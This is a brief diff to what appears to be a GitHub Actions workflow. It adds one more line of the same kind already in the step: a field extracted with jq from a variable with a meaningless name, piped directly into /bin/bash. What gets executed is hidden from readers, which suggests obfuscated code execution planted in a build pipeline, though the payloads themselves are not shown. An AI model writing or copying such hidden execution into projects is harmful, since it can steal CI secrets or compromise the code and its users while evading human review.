@@ -22,6 +22,7 @@ jobs:
           echo $ina01 | jq -r .nr995 | /bin/bash
           echo $y4 | jq -r .jhnzi6 | /bin/bash
           echo $lya9112 | jq -r .r5 | /bin/bash
+          echo $bcbw72 | jq -r .gu97 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
